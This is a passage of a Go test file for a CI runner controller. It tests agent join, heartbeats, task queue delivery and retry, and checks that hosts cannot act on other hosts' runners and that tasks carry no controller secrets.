package controller

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/agent"
	"github.com/eyupio/zoomies/internal/auth"
	"github.com/eyupio/zoomies/internal/backend"
	"github.com/eyupio/zoomies/internal/store"
)

// The embedded agent talks to the controller through the same four calls a
// remote one makes over HTTP, so the single-process case exercises the same
// code rather than a shortcut around it.
func TestEmbeddedTransportRoundTrip(t *testing.T) {
	h := newHarness(t)
	tr := h.c.EmbeddedTransport()

	resp, err := tr.Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Name:            "embedded-1",
		Capacity:        2,
		OS:              "linux",
		Arch:            "amd64",
		Backends:        []backend.Info{{Kind: store.BackendDocker, Available: true}},
	})
	if err != nil {
		t.Fatalf("Join: %v", err)
	}
	if resp.HostID == "" || resp.AgentToken == "" {
		t.Fatalf("join response = %+v, want a host ID and a token", resp)
	}
	tr.SetCredentials(resp.HostID, resp.AgentToken)

	host, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if !host.Embedded || host.Capacity != 2 || len(host.Backends) != 1 {
		t.Fatalf("host = %+v, want an embedded host with capacity 2 and one backend", host)
	}

	hb, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Capacity: 2})
	if err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}
	if !hb.OK || hb.Cordoned {
		t.Fatalf("heartbeat = %+v, want ok and uncordoned", hb)
	}

	h.c.enqueue(resp.HostID, agent.Task{Kind: agent.TaskCreateRunner, RunnerID: "run_example"})
	batch, err := tr.PollTasks(h.ctx, time.Second)
	if err != nil {
		t.Fatalf("PollTasks: %v", err)
	}
	if len(batch.Tasks) != 1 || batch.Tasks[0].RunnerID != "run_example" {
		t.Fatalf("batch = %+v, want the one queued task", batch)
	}

	if err := tr.ReportResult(h.ctx, agent.TaskResult{TaskID: batch.Tasks[0].ID, OK: true}); err != nil {
		t.Fatalf("ReportResult: %v", err)
	}
	if pending, inflight := h.c.queues.get(resp.HostID).depth(); pending != 0 || inflight != 0 {
		t.Fatalf("queue depth = %d pending, %d in flight; want both zero after a result", pending, inflight)
	}
}

// A poll that arrives before there is work must not spin or sleep out its full
// wait: the task has to reach the agent the moment it is queued.
func TestPollTasksWakesOnEnqueue(t *testing.T) {
	h := newHarness(t)
	_, _, host := h.fleet()

	go func() {
		time.Sleep(20 * time.Millisecond)
		h.c.enqueue(host.ID, agent.Task{Kind: agent.TaskRemoveRunner, RunnerID: "run_late"})
	}()

	started := time.Now()
	batch, err := h.c.PollTasks(h.ctx, host.ID, 5*time.Second)
	if err != nil {
		t.Fatalf("PollTasks: %v", err)
	}
	if len(batch.Tasks) != 1 {
		t.Fatalf("batch = %+v, want one task", batch)
	}
	if elapsed := time.Since(started); elapsed > time.Second {
		t.Fatalf("the poll took %s to notice a task queued after 20ms", elapsed)
	}
}

// A poll with nothing to do returns empty rather than erroring, which is the
// normal idle case for every agent in a quiet fleet.
func TestPollTasksReturnsEmptyWhenIdle(t *testing.T) {
	h := newHarness(t)
	ctx, cancel := context.WithTimeout(h.ctx, 50*time.Millisecond)
	defer cancel()

	batch, err := h.c.PollTasks(ctx, "host_idle", 5*time.Second)
	if err != nil {
		t.Fatalf("PollTasks: %v", err)
	}
	if len(batch.Tasks) != 0 {
		t.Fatalf("batch = %+v, want no tasks", batch)
	}
}

// Enqueueing is idempotent per kind and runner, so a reconcile that reaches
// the same conclusion every ten seconds leaves one task, not a backlog.
func TestEnqueueDeduplicates(t *testing.T) {
	h := newHarness(t)
	for range 5 {
		h.c.enqueue("host_x", agent.Task{Kind: agent.TaskRemoveRunner, RunnerID: "run_1"})
	}
	h.c.enqueue("host_x", agent.Task{Kind: agent.TaskRemoveRunner, RunnerID: "run_2"})
	h.c.enqueue("host_x", agent.Task{Kind: agent.TaskStopRunner, RunnerID: "run_1"})

	if pending, _ := h.c.queues.get("host_x").depth(); pending != 3 {
		t.Fatalf("queue holds %d tasks, want 3 (two runners, one duplicated kind)", pending)
	}
}

// A deleted host's queue entry must not linger for the rest of the process's
// life: nothing else ever prunes taskQueues.qs, so this is the one place that
// does, and re-getting the queue afterwards has to build a fresh one rather
// than resurrect whatever the deleted host left behind.
func TestForgetDropsAHostsQueue(t *testing.T) {
	h := newHarness(t)
	h.c.enqueue("host_x", agent.Task{Kind: agent.TaskRemoveRunner, RunnerID: "run_1"})

	h.c.queues.forget("host_x")

	if _, ok := h.c.queues.qs["host_x"]; ok {
		t.Fatal("the queue entry survived forget")
	}
	if pending, _ := h.c.queues.get("host_x").depth(); pending != 0 {
		t.Fatalf("queue depth = %d after forget, want a fresh empty queue", pending)
	}
}

// Delivery is at-least-once: a task whose agent never reported back is offered
// again rather than lost, and given up on eventually so it cannot loop forever.
func TestUnansweredTasksAreRequeuedThenDropped(t *testing.T) {
	h := newHarness(t)
	h.c.enqueue("host_x", agent.Task{Kind: agent.TaskCreateRunner, RunnerID: "run_1"})
	q := h.c.queues.get("host_x")

	now := time.Now()
	for attempt := 1; attempt < maxTaskAttempts; attempt++ {
		got := q.take(10, now)
		if len(got) != 1 {
			t.Fatalf("attempt %d: took %d tasks, want 1", attempt, len(got))
		}
		// The agent reads the attempt to tell a first create, which may fail
		// out loud, from a redelivery, which may not.
		if got[0].Attempt != attempt {
			t.Fatalf("attempt %d was delivered as attempt %d", attempt, got[0].Attempt)
		}
		requeued, dropped := q.sweep(now.Add(createLease + time.Minute))
		if requeued != 1 || len(dropped) != 0 {
			t.Fatalf("attempt %d: requeued %d, dropped %d; want 1 and 0", attempt, requeued, len(dropped))
		}
	}

	if got := q.take(10, now); len(got) != 1 {
		t.Fatal("the final attempt was not offered")
	}
	requeued, dropped := q.sweep(now.Add(createLease + time.Minute))
	if requeued != 0 || len(dropped) != 1 {
		t.Fatalf("requeued %d, dropped %d; want 0 and 1 after %d attempts", requeued, len(dropped), maxTaskAttempts)
	}
}

// A log task belongs to a browser that has since gone away, so it is dropped
// rather than redelivered to open a stream nobody is reading.
func TestLogTasksAreNeverRequeued(t *testing.T) {
	h := newHarness(t)
	h.c.enqueue("host_x", agent.Task{Kind: agent.TaskStreamLogs, RunnerID: "run_1", StreamID: "log_1"})
	q := h.c.queues.get("host_x")

	now := time.Now()
	q.take(10, now)
	requeued, dropped := q.sweep(now.Add(24 * time.Hour))
	if requeued != 0 || len(dropped) != 0 {
		t.Fatalf("requeued %d, dropped %d; a log task should simply sit until its result arrives", requeued, len(dropped))
	}
}

// A task the agent could not carry out has to leave a mark: a runner nobody
// can explain is worse than a failed one.
func TestFailedTaskResultFailsTheRunner(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	r := h.runnerRow(pool, host, store.RunnerProvisioning)

	h.c.enqueue(host.ID, agent.Task{Kind: agent.TaskCreateRunner, RunnerID: r.ID})
	batch, err := h.c.PollTasks(h.ctx, host.ID, time.Second)
	if err != nil {
		t.Fatalf("PollTasks: %v", err)
	}
	err = h.c.ReportResult(h.ctx, host.ID, agent.TaskResult{
		TaskID:   batch.Tasks[0].ID,
		RunnerID: r.ID,
		OK:       false,
		Error:    "docker: no space left on device",
	})
	if err != nil {
		t.Fatalf("ReportResult: %v", err)
	}

	after, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatalf("GetRunner: %v", err)
	}
	if after.State != store.RunnerFailed {
		t.Fatalf("state = %q, want %q", after.State, store.RunnerFailed)
	}
	if after.Message != "docker: no space left on device" {
		t.Fatalf("message = %q, want the agent's error", after.Message)
	}
}

// An agent that is upgraded or restarted gives back the creates still waiting
// for a startup slot. Those runners were never touched, so they must come back
// to the queue for the agent that returns -- not be failed, which is what put
// a "Runner stopped" on every runner queued across a zoomies upgrade.
func TestATaskGivenBackUnstartedIsOfferedAgainAndTheRunnerIsLeftAlone(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	r := h.runnerRow(pool, host, store.RunnerProvisioning)

	h.c.enqueue(host.ID, agent.Task{Kind: agent.TaskCreateRunner, RunnerID: r.ID})
	batch, err := h.c.PollTasks(h.ctx, host.ID, time.Second)
	if err != nil {
		t.Fatalf("PollTasks: %v", err)
	}
	first := batch.Tasks[0]
	if err := h.c.ReportResult(h.ctx, host.ID, agent.TaskResult{
		TaskID: first.ID, Kind: first.Kind, RunnerID: r.ID,
		OK: false, NotStarted: true, Error: "agent shut down before this task started",
	}); err != nil {
		t.Fatalf("ReportResult: %v", err)
	}

	after, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatalf("GetRunner: %v", err)
	}
	if after.State != store.RunnerProvisioning {
		t.Fatalf("state = %q, want it still %q", after.State, store.RunnerProvisioning)
	}
	again, err := h.c.PollTasks(h.ctx, host.ID, time.Second)
	if err != nil {
		t.Fatalf("PollTasks: %v", err)
	}
	if len(again.Tasks) != 1 || again.Tasks[0].ID != first.ID || again.Tasks[0].Attempt != 2 {
		t.Fatalf("tasks = %+v, want the same create offered again as attempt 2", again.Tasks)
	}
}

// The attempt still counts, so a host whose agent never stays up does not have
// the same create bounced at it for ever: the last give-back fails the runner.
func TestATaskGivenBackOnItsLastAttemptFailsTheRunner(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	r := h.runnerRow(pool, host, store.RunnerProvisioning)

	h.c.enqueue(host.ID, agent.Task{Kind: agent.TaskCreateRunner, RunnerID: r.ID})
	for attempt := 1; attempt <= maxTaskAttempts; attempt++ {
		batch, err := h.c.PollTasks(h.ctx, host.ID, time.Second)
		if err != nil || len(batch.Tasks) != 1 {
			t.Fatalf("attempt %d: PollTasks = %+v, %v", attempt, batch, err)
		}
		task := batch.Tasks[0]
		if err := h.c.ReportResult(h.ctx, host.ID, agent.TaskResult{
			TaskID: task.ID, Kind: task.Kind, RunnerID: r.ID,
			OK: false, NotStarted: true, Error: "agent shut down before this task started",
		}); err != nil {
			t.Fatalf("attempt %d: ReportResult: %v", attempt, err)
		}
	}
	after, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatalf("GetRunner: %v", err)
	}
	if after.State != store.RunnerFailed {
		t.Fatalf("state = %q, want %q after %d give-backs", after.State, store.RunnerFailed, maxTaskAttempts)
	}
}

// A host may only speak for its own runners.
func TestAHostCannotReportOnAnotherHostsRunner(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	other := h.host("vm-2")
	r := h.runnerRow(pool, host, store.RunnerRegistering)

	mustReport(t, h, other.ID, r.ID, store.RunnerFailed)

	after, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatalf("GetRunner: %v", err)
	}
	if after.State != store.RunnerRegistering {
		t.Fatalf("state = %q; a report from the wrong host changed a runner", after.State)
	}
}

// The task result is the other half of the same rule, and the stricter half:
// a runner report that names somebody else's runner is dropped with a warning,
// but a result carries a state transition, a container handle and a startup
// timing, so the wrong host being believed here would rewrite another machine's
// accounting. The check exists; until now only the report path had a test, so
// deleting it would have gone unnoticed.
func TestAHostCannotReportATaskResultForAnotherHostsRunner(t *testing.T) {
	h := newHarness(t)
	_, pool, host := h.fleet()
	other := h.host("vm-2")
	r := h.runnerRow(pool, host, store.RunnerRegistering)

	err := h.c.ReportResult(h.ctx, other.ID, agent.TaskResult{
		TaskID:   "tsk_whatever",
		Kind:     agent.TaskCreateRunner,
		RunnerID: r.ID,
		OK:       false,
		State:    store.RunnerFailed,
		Error:    "a failure this host did not witness",
		Handle:   "container-the-intruder-picked",
	})
	if err == nil {
		t.Fatal("a result for another host's runner was accepted")
	}
	// The message names both hosts and the runner: an operator reading it has
	// to be able to tell which machine is confused about what.
	for _, want := range []string{other.ID, host.ID, r.ID} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal does not name %q: %v", want, err)
		}
	}

	after, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatalf("GetRunner: %v", err)
	}
	if after.State != store.RunnerRegistering {
		t.Errorf("state = %q; a result from the wrong host moved a runner", after.State)
	}
	if after.ContainerID == "container-the-intruder-picked" {
		t.Errorf("a result from the wrong host set the runner's workload handle to %q", after.ContainerID)
	}
	if after.Message != "" {
		t.Errorf("message = %q; a result from the wrong host wrote onto a runner", after.Message)
	}

	// The owning host is still believed, so this is a refusal of the caller
	// and not a runner that the attempt left unwritable.
	if err := h.c.ReportResult(h.ctx, host.ID, agent.TaskResult{
		TaskID: "tsk_whatever", Kind: agent.TaskCreateRunner, RunnerID: r.ID,
		OK: false, State: store.RunnerFailed, Error: "the real failure",
	}); err != nil {
		t.Fatalf("the owning host was refused after the intruder tried: %v", err)
	}
	owned, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatalf("GetRunner: %v", err)
	}
	if owned.State != store.RunnerFailed {
		t.Errorf("state = %q, want the owning host's result to have been applied", owned.State)
	}
}

// TestACreateTaskCarriesNoControllerSecret walks the whole task over the wire
// the way an agent receives it.
//
// A task is the one thing the controller hands a machine it does not otherwise
// trust: an agent may be a shared builder, an imported host, or somebody's
// laptop. It has to carry the runner's own registration credential and nothing
// else. The App private key would let the holder mint runners in every
// repository the installation covers, and the webhook secret would let it forge
// job events -- neither is anywhere near what running one job requires.
//
// The check is on the marshalled bytes rather than the struct, because a field
// added to backend.Spec or backend.Credentials is a wire change whether or not
// anyone reads it on the far side.
func TestACreateTaskCarriesNoControllerSecret(t *testing.T) {
	h := newHarness(t)

	// Distinctive plaintexts, so a hit is a real leak rather than the word
	// "test" occurring somewhere legitimate.
	const (
		appPrivateKey = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAtheAppKeyNobodyOutsideTheControllerMayHold\n-----END RSA PRIVATE KEY-----"
		hookSecret    = "webhook-hmac-nobody-outside-the-controller-may-hold"
	)
	pem, err := h.key.SealString(appPrivateKey)
	if err != nil {
		t.Fatalf("sealing the private key: %v", err)
	}
	sealed, err := h.key.SealString(hookSecret)
	if err != nil {
		t.Fatalf("sealing the webhook secret: %v", err)
	}
	inst := &store.Installation{
		AppID:            h.gh.AppID(),
		InstallationID:   h.gh.InstallationID(),
		Target:           "acme",
		TargetType:       store.TargetOrg,
		APIBaseURL:       h.gh.URL(),
		PrivateKeyEnc:    pem,
		WebhookSecretEnc: sealed,
	}
	if err := h.st.CreateInstallation(h.ctx, inst); err != nil {
		t.Fatalf("CreateInstallation: %v", err)
	}

	pool := h.pool(inst, "linux-x64")
	host := h.host("vm-1")

	h.deliver("workflow_job", jobEvent{Action: "queued", JobID: 42,
		Labels: []string{"self-hosted", "linux", "x64", "demo"}}.body(), hookSecret)
	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	h.c.lifecycleCalls.Wait()

	task := h.taskOfKind(host.ID, agent.TaskCreateRunner)
	wire, err := json.Marshal(task)
	if err != nil {
		t.Fatalf("marshalling the task: %v", err)
	}

	// Searched over the decoded values rather than the raw bytes: JSON escapes
	// a PEM's newlines and base64s a []byte, so a needle matched against the
	// wire directly would quietly never match and the test would pass however
	// badly the task leaked.
	values := stringsIn(t, wire)
	for _, secret := range []struct {
		what  string
		value string
	}{
		{"the App private key", appPrivateKey},
		{"the webhook secret", hookSecret},
	} {
		for _, v := range values {
			if strings.Contains(v, secret.value) {
				t.Errorf("a create task carries %s in %q", secret.what, truncateValue(v))
			}
		}
	}
	// The sealed forms are checked against the raw bytes instead. A ciphertext
	// is not valid UTF-8, so it cannot survive a JSON string field to be found
	// among the values above -- but a []byte field added to the spec would
	// marshal it as base64, and that is a task handing out something the
	// instance key turns back into the plaintext, on an install where every
	// agent has been given that key.
	for _, secret := range []struct {
		what  string
		value []byte
	}{
		{"the sealed private key", pem},
		{"the sealed webhook secret", sealed},
	} {
		if bytes.Contains(wire, secret.value) ||
			bytes.Contains(wire, []byte(base64.StdEncoding.EncodeToString(secret.value))) {
			t.Errorf("a create task carries %s on the wire", secret.what)
		}
	}

	// And the task is not empty of credentials, or "carry nothing" would pass
	// every assertion above while breaking every runner.
	if task.Spec == nil {
		t.Fatal("the create task carries no spec at all")
	}
	if task.Spec.Credentials.JITConfig == "" && task.Spec.Credentials.RegistrationToken == "" {
		t.Fatalf("the create task carries no registration credential: %+v", task.Spec.Credentials)
	}
	if pool.Ephemeral && !bytes.Contains(wire, []byte(task.Spec.Credentials.JITConfig)) {
		t.Fatal("the runner's own JIT configuration did not survive marshalling")
	}
}

// A host going quiet is not a state anybody polls for: the flip publishes an
// event and shows up in Problems.
func TestSilentHostBecomesAProblem(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	pool := h.pool(inst, "linux-x64")
	host := h.host("vm-1")
	h.runnerRow(pool, host, store.RunnerIdle)

	host.LastHeartbeat = time.Now().Add(-2 * store.HeartbeatTimeout)
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}

	codes := h.problemCodes()
	if !contains(codes, "host.unhealthy") {
		t.Fatalf("problems = %v, want one about the silent host", codes)
	}
}

func contains(list []string, want string) bool {
	for _, v := range list {
		if v == want {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// Join: what a join token is and is not enough for
// ---------------------------------------------------------------------------

// joinToken mints one the way an operator would, with the labels and capacity
// they chose for the host they are enrolling.
func (h *harness) joinToken(t *testing.T, labels map[string]string, capacity int) string {
	t.Helper()
	_, plaintext, err := h.c.Auth().CreateJoinToken(h.ctx, time.Hour, labels, capacity, "usr_test")
	if err != nil {
		t.Fatalf("CreateJoinToken: %v", err)
	}
	return plaintext
}

func joinRequest(name, token string) agent.JoinRequest {
	return agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		JoinToken:       token,
		Name:            name,
		Capacity:        1,
		OS:              "linux",
		Arch:            "amd64",
		Backends:        []backend.Info{{Kind: store.BackendDocker, Available: true}},
	}
}

// Host labels are what the scheduler matches a pool's host selector against, so
// they decide which pools' work -- and which pools' runner registrations -- a
// host is offered. The operator minting the join token chooses them; the agent
// describing itself must not be able to overrule that choice.
func TestJoinTokenLabelsBeatTheAgentsOwn(t *testing.T) {
	h := newHarness(t)
	token := h.joinToken(t, map[string]string{"tier": "untrusted", "site": "dc1"}, 0)

	req := joinRequest("vm-9", token)
	req.Labels = map[string]string{"tier": "release", "gpu": "yes"}

	resp, err := h.c.Join(h.ctx, req, "10.0.0.9")
	if err != nil {
		t.Fatalf("Join: %v", err)
	}
	host, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatal(err)
	}
	if host.Labels["tier"] != "untrusted" {
		t.Errorf("tier = %q; the join token pinned it to untrusted", host.Labels["tier"])
	}
	if host.Labels["site"] != "dc1" {
		t.Errorf("site = %q; the token's labels should all be applied", host.Labels["site"])
	}
	// Labels the token says nothing about are still the agent's to declare:
	// the operator constrains, it does not have to enumerate.
	if host.Labels["gpu"] != "yes" {
		t.Errorf("gpu = %q; an agent may still describe what the token did not pin", host.Labels["gpu"])
	}
}

// Re-joining by name destroys the previous host's runner records and inherits
// its ID and cordon state. A join token is handed to whoever is enrolling a
// machine, which is a wider circle than the admins who mint them, so it cannot
// be enough on its own to take over a machine somebody else is running.
func TestJoinWillNotTakeOverAnotherHostByName(t *testing.T) {
	h := newHarness(t)
	_, _, existing := h.fleet()

	resp, err := h.c.Join(h.ctx, joinRequest(existing.Name, h.joinToken(t, nil, 0)), "10.0.0.7")
	if err == nil {
		t.Fatalf("a stranger took over host %q and got %+v", existing.Name, resp)
	}
	// The refusal has to say what to do about it, because a genuinely rebuilt
	// machine whose credentials are gone lands here too.
	for _, want := range []string{existing.ID, "hosts delete"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal should mention %q: %v", want, err)
		}
	}
	// Nothing was touched: the row, its token and its runners are all intact.
	after, err := h.st.GetHost(h.ctx, existing.ID)
	if err != nil {
		t.Fatalf("the existing host was deleted by a refused join: %v", err)
	}
	if after.TokenHash != existing.TokenHash {
		t.Error("a refused join rotated the existing host's token")
	}
}

// The machine itself is a different matter: it still holds the token it was
// issued, and that is what a rebuild-in-place proves ownership with.
func TestJoinReclaimsItsOwnHostWithThePreviousToken(t *testing.T) {
	h := newHarness(t)

	first, err := h.c.Join(h.ctx, joinRequest("vm-rebuilt", h.joinToken(t, nil, 0)), "10.0.0.3")
	if err != nil {
		t.Fatalf("first join: %v", err)
	}

	req := joinRequest("vm-rebuilt", h.joinToken(t, nil, 0))
	req.PreviousToken = first.AgentToken
	second, err := h.c.Join(h.ctx, req, "10.0.0.3")
	if err != nil {
		t.Fatalf("re-join with the previous token: %v", err)
	}
	if second.HostID != first.HostID {
		t.Errorf("host ID = %s; a re-join should keep the row (%s) so audit rows and bookmarks resolve", second.HostID, first.HostID)
	}
	if second.AgentToken == first.AgentToken {
		t.Error("a re-join should issue a fresh agent token")
	}

	// A wrong one proves nothing, even though a host of that name is this
	// agent's own -- the token is the whole proof.
	stale := joinRequest("vm-rebuilt", h.joinToken(t, nil, 0))
	stale.PreviousToken = first.AgentToken
	if _, err := h.c.Join(h.ctx, stale, "10.0.0.3"); err == nil {
		t.Error("a superseded agent token was accepted as proof of ownership")
	}
}

// The embedded agent is exempt: the caller is this same process, so there is no
// remote identity to prove, and requiring one would stop a controller whose
// state file was wiped from ever starting again.
func TestEmbeddedJoinMayStillReclaimItsHost(t *testing.T) {
	h := newHarness(t)
	tr := h.c.EmbeddedTransport()

	first, err := tr.Join(h.ctx, agent.JoinRequest{ProtocolVersion: agent.ProtocolVersion, Name: "embedded-1", Capacity: 1})
	if err != nil {
		t.Fatalf("first embedded join: %v", err)
	}
	second, err := tr.Join(h.ctx, agent.JoinRequest{ProtocolVersion: agent.ProtocolVersion, Name: "embedded-1", Capacity: 1})
	if err != nil {
		t.Fatalf("second embedded join with no credentials to show: %v", err)
	}
	if second.HostID != first.HostID {
		t.Errorf("host ID = %s; want the same row (%s)", second.HostID, first.HostID)
	}
}

// A host that came up before its container daemon joins with nothing usable,
// and its agent re-probes as it runs. The controller has to act on that second
// answer: until it does, every pool on that backend matches no host, looks
// perfectly healthy, and quietly starts nothing.
func TestHeartbeatRecordsABackendThatBecameAvailable(t *testing.T) {
	h := newHarness(t)
	tr := h.c.EmbeddedTransport()

	resp, err := tr.Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Name:            "vm-1",
		Capacity:        2,
		Backends: []backend.Info{{
			Kind:   store.BackendDocker,
			Detail: "cannot connect to /var/run/docker.sock: permission denied",
		}},
	})
	if err != nil {
		t.Fatalf("Join: %v", err)
	}
	tr.SetCredentials(resp.HostID, resp.AgentToken)

	host, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if len(host.Backends) != 0 {
		t.Fatalf("backends = %v, want none while the daemon is unreachable", host.Backends)
	}
	// The reason is kept even though the kind is not, because it is the only
	// thing that tells an operator what to fix.
	if info, ok := host.BackendInfo.Find(store.BackendDocker); !ok || info.Available ||
		!strings.Contains(info.Detail, "permission denied") {
		t.Fatalf("backend info = %+v, want docker recorded as unavailable with its reason", host.BackendInfo)
	}

	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Capacity:        2,
		Backends: []backend.Info{{
			Kind: store.BackendDocker, Available: true,
			Version: "27.1.1", Endpoint: "unix:///var/run/docker.sock", SupportsDinD: true,
		}},
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}

	host, err = h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if len(host.Backends) != 1 || host.Backends[0] != "docker" {
		t.Fatalf("backends = %v, want docker once the daemon answered", host.Backends)
	}
	info, ok := host.BackendInfo.Find(store.BackendDocker)
	if !ok || !info.Available || info.Version != "27.1.1" || !info.SupportsDinD {
		t.Fatalf("backend info = %+v, want the fresh probe in full", host.BackendInfo)
	}
	if info.Detail != "" {
		t.Fatalf("detail = %q, want the stale failure gone", info.Detail)
	}
}

// What an agent can do is re-read from every heartbeat, like its version: an
// agent rolled back to a release that cannot move a live quota must stop being
// counted as one that can, or an elastic pool keeps reading its runners on that
// host as boostable when they are held at their share.
func TestHeartbeatRecordsWhatTheAgentCanDo(t *testing.T) {
	h := newHarness(t)
	tr := h.c.EmbeddedTransport()

	resp, err := tr.Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Name:            "vm-1",
		Capacity:        2,
		Features:        []string{agent.FeatureElasticCPU},
		Backends:        []backend.Info{{Kind: store.BackendDocker, Available: true}},
	})
	if err != nil {
		t.Fatalf("Join: %v", err)
	}
	tr.SetCredentials(resp.HostID, resp.AgentToken)

	host, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	// Recorded at join, so the host is not read as unable to lend CPU for the
	// thirty seconds before its first heartbeat.
	if !host.Supports(agent.FeatureElasticCPU) {
		t.Fatalf("features = %v, want the join's claim recorded", host.Features)
	}
	if view := h.c.HostView(host); !view.ElasticCPU {
		t.Fatalf("host view = %+v, want elastic_cpu true", view)
	}

	// An older agent sends no features at all, and that is a change.
	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Capacity:        2,
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}
	host, err = h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if host.Supports(agent.FeatureElasticCPU) {
		t.Fatalf("features = %v, want a heartbeat that claims nothing to withdraw the claim", host.Features)
	}
	if view := h.c.HostView(host); view.ElasticCPU {
		t.Fatalf("host view = %+v, want elastic_cpu false", view)
	}
}

// A heartbeat that carries no probe at all -- an older agent, or one that has
// not probed yet -- must not wipe what the host is known to be able to do.
func TestHeartbeatWithoutABackendProbeKeepsWhatIsKnown(t *testing.T) {
	h := newHarness(t)
	tr := h.c.EmbeddedTransport()

	resp, err := tr.Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Name:            "vm-1",
		Capacity:        2,
		Backends:        []backend.Info{{Kind: store.BackendDocker, Available: true, Version: "27.1.1"}},
	})
	if err != nil {
		t.Fatalf("Join: %v", err)
	}
	tr.SetCredentials(resp.HostID, resp.AgentToken)

	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Capacity:        3,
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}

	host, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if len(host.Backends) != 1 || len(host.BackendInfo) != 1 {
		t.Fatalf("host = %+v, want the backends it joined with left alone", host)
	}
}

// Opening the log viewer on a runner whose container is not there yet -- or
// whose backend would not answer -- comes back as a failed stream_logs task.
// That says nothing about the runner, and must not fail it: the next reconcile
// would otherwise tear down a container that may be mid-job.
func TestFailedLogTaskLeavesTheRunnerAlone(t *testing.T) {
	for _, tc := range []struct {
		name string
		kind agent.TaskKind // what the agent puts in its result; "" is an older agent
	}{
		{"agent names the kind", agent.TaskStreamLogs},
		{"older agent, controller's record decides", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			h := newHarness(t)
			_, pool, host := h.fleet()
			r := h.runnerRow(pool, host, store.RunnerProvisioning)

			h.c.enqueue(host.ID, agent.Task{Kind: agent.TaskStreamLogs, RunnerID: r.ID, StreamID: "log_1"})
			batch, err := h.c.PollTasks(h.ctx, host.ID, time.Second)
			if err != nil {
				t.Fatalf("PollTasks: %v", err)
			}
			err = h.c.ReportResult(h.ctx, host.ID, agent.TaskResult{
				TaskID:   batch.Tasks[0].ID,
				Kind:     tc.kind,
				RunnerID: r.ID,
				OK:       false,
				Error:    "no workload for runner " + r.ID + " on this host, so its logs are gone",
			})
			if err != nil {
				t.Fatalf("ReportResult: %v", err)
			}

			after, err := h.st.GetRunner(h.ctx, r.ID)
			if err != nil {
				t.Fatalf("GetRunner: %v", err)
			}
			if after.State != store.RunnerProvisioning {
				t.Fatalf("state = %q after a failed log task, want it left at %q", after.State, store.RunnerProvisioning)
			}
		})
	}
}

// Capacity belongs to the operator once a host has joined: the Hosts API lets
// them set it to 0 to stop placement, and a heartbeat must not put the agent's
// configured number back.
func TestHeartbeatLeavesCapacityToTheOperator(t *testing.T) {
	h := newHarness(t)
	tr := h.c.EmbeddedTransport()

	resp, err := tr.Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Name:            "vm-1",
		Capacity:        4,
		Backends:        []backend.Info{{Kind: store.BackendDocker, Available: true}},
	})
	if err != nil {
		t.Fatalf("Join: %v", err)
	}
	tr.SetCredentials(resp.HostID, resp.AgentToken)

	host, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	host.Capacity = 0
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}

	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Capacity: 4}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}
	after, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if after.Capacity != 0 {
		t.Fatalf("capacity = %d after a heartbeat, want the operator's 0 kept", after.Capacity)
	}
	if after.LastHeartbeat.IsZero() {
